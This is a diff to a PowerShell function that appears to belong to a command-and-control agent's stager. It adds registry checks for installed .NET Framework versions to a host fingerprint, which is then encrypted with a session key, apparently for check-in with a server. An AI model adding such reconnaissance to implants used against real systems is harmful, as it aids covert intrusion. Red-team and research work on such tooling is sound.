@@ -1047,6 +1047,28 @@ function Start-Negotiate {
     $i += "|$($proc.ProcessName)|$($proc.Id)"
     $i += "|powershell|$($PSVersionTable.PSVersion.Major)"
     $i += "|$env:PROCESSOR_ARCHITECTURE"
+    $dotnetVer = ""
+    try {
+        $clr4 = ""
+        $clr2 = ""
+        $v4full = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" -EA SilentlyContinue
+        if ($v4full -and $v4full.Install -eq 1) {
+            $r = $v4full.Release
+            $clr4 = if ($r -ge 528040) { "net48" }
+                     elseif ($r -ge 460798) { "net47" }
+                     elseif ($r -ge 393295) { "net46" }
+                     else { "net45" }
+        } else {
+            $v4 = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0" -EA SilentlyContinue
+            if ($v4 -and $v4.Install -eq 1) { $clr4 = "net40" }
+        }
+        $v35 = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5" -EA SilentlyContinue
+        if ($v35 -and $v35.Install -eq 1) { $clr2 = "net35" }
+        if ($clr4 -and $clr2) { $dotnetVer = "$clr4,net35" }
+        elseif ($clr4) { $dotnetVer = $clr4 }
+        elseif ($clr2) { $dotnetVer = $clr2 }
+    } catch { $dotnetVer = "" }
+    $i += "|$dotnetVer"
 
     $ib2 = $e.GetBytes($i)
     $eb2 = Aes-EncryptThenHmac -Key $SessionKey -Plain $ib2
